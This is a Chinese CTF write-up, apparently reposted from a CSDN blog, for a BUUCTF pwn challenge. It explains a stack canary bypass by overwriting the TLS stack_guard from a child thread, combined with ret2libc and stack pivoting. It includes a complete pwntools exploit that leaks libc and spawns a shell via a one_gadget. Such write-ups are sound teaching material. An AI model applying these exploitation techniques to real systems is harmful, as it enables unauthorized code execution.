+++
title = "wp3"
date = "2026-04-14"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
### 前置知识
`canary`防御措施与其绕过
`ret2libc`
栈迁移（可用）
### 整体思路
题目非常简单粗暴，主要逻辑是在一个子线程中实现的。首先输入要输入的长度，然后再输入payload，且长度可以非常大。因此，要进行栈溢出的唯一难点就在`canary`，而`canary`是位于`fs`寄存器 中的，也就是`TLS`结构体的一个偏移。在子线程中，`tls`结构体在栈中的偏移是固定的，可以在`gdb`中通过`p/x *(tcbhead_t*)(pthread_self())`方式来查看`tls`结构体的值。其中`stack_guard`就是`canary`的值，校验`canary`时会取出这个值和栈中的`canary`进行校验，==因此覆盖这个值为想要的值即可==。可以在`gdb`通过`p/x &(*(tcbhead_t*)(pthread_self())).stack_guard`来查看其地址。
此外，在`ret2libc`过程中我没有回到函数起始位置，而是布置了一个`read`函数来读取数据到可读写段再栈迁移，这是由于回到函数起始位置的方式难以调试。

在这里补充一下如何覆盖canary的值：
TSL覆盖canary的值
### exp
```python
from pwn import *
from LibcSearcher import *

filename = './bs'
context(log_level='debug')
local = 0
elf = ELF(filename)
libc = ELF('/glibc/2.27-3ubuntu1_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 28009)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()


def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))


pop_rdi = 0x400c03 
pop_rsi_r15 = 0x400c01
leave_ret = 0x400955

sh.recv()
sh.sendline(str(0x1848 + 0x8))
fake_rbp = 0x602100
payload = b'a'*0x1010 + p64(fake_rbp) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_rbp) + p64(0xdeadbeaf) + p64(elf.plt['read']) + p64(leave_ret)
payload = payload.ljust(0x1848+8, b'a')
sh.send(payload)
sh.recvuntil('It\'s time to say goodbye.\n', drop=False)
puts_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('puts_leak', puts_leak)
libc.address = puts_leak - 0x809c0
leak_info('libc.address', libc.address)

system_addr = libc.sym['system']
str_bin_sh = next(libc.search(b'/bin/sh\x00'))
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
payload = p64(0xdeadbeaf)  + p64(one_gadget[1] + libc.address) +p64(0xdeadbeaf)
# payload = p64(0xdeadbeaf) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) +p64(0xdeadbeaf)
leak_info('system', system_addr)
leak_info('str_bin_sh', str_bin_sh)
# debug()
sh.send(payload)
sh.interactive()
# debug()
```


————————————————
版权声明：本文为CSDN博主「LtfallQwQ」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/xy1458214551/article/details/134693395
